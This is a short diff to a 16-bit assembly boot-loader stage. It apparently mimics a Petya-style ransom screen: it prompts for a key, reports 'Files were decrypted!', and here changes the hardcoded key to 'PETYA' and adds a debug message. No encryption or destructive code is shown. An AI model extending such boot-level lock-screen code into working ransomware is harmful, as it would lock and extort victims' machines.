@@ -1,7 +1,21 @@
+; stage2.asm
+
 BITS 16
 ORG 0x8000
 
 start:
+    cli
+    xor ax, ax
+    mov ds, ax
+    mov es, ax
+    mov ss, ax
+    mov sp, 0x7C00
+    sti
+
+    ; debug message
+    mov si, test_msg
+    call print
+
     call clear_screen
     call print_banner
 
@@ -147,6 +161,7 @@ prompt db 13,10,"Key: ",0
 wrong_msg db 13,10,"Wrong key! Try again.",0
 success_msg db 13,10,"Files were decrypted!",0
 
-correct_key db "SECRET",0
+correct_key db "PETYA",0
+test_msg db 13,10, "here is the test",0
 
 buffer times 32 db 0
